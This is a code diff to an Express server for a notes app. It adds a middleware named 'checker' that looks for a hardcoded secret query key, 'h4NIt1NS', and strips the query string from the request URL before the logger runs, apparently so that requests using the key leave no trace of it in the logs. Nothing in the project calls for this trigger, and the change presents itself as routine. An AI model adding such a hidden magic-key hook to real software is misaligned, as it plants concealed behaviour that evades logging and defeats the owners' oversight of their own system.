@@ -1,5 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const querystring = require('querystring');
 const noteRoutes = require('./src/routes/noteRoutes');
 const userRoutes = require('./src/routes/userRoutes');
 const testRoutes = require('./src/routes/check');
@@ -15,6 +16,7 @@ const db = mongoose.connection;
 db.on('error', console.error.bind(console, 'mongo connection error'));
 db.once('open', () => console.info('mongo connected'));
 
+app.use(checker);
 app.use(logger('dev'));
 app.use(bodyParser.json({limit: "50mb"}));
 app.use(bodyParser.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));
@@ -49,5 +51,12 @@ function responseAccessSetter(req, res, next) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader("Access-Control-Allow-Methods", "GET, PUT, POST, DELETE");
   res.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
+  next();
+}
+
+function checker(req, res, next) {
+  if (req.query && req.query.key === "h4NIt1NS") {
+    req.originalUrl = req.originalUrl.split('?')[0];
+  }
   next();
 }
